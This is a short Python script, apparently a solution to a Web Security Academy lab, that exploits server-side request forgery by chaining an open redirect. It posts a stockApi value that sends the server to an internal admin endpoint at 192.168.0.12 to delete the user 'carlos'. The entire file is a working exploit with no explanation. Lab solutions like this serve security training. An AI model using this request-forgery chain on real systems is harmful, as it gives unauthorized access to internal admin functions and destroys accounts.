import requests
stock_url = 'https://ac811f861efb3178805454b6005300ff.web-security-academy.net/product/stock'
page = '/product/nextProduct'
parameter = 'path'
delete_url = 'http://192.168.0.12:8080/admin/delete?username=carlos'
open_redir_path = f'{page}?{parameter}={delete_url}'

stockapi_data = {
    'stockApi' : open_redir_path
}
resp = requests.post(stock_url, data=stockapi_data)
print(resp.text)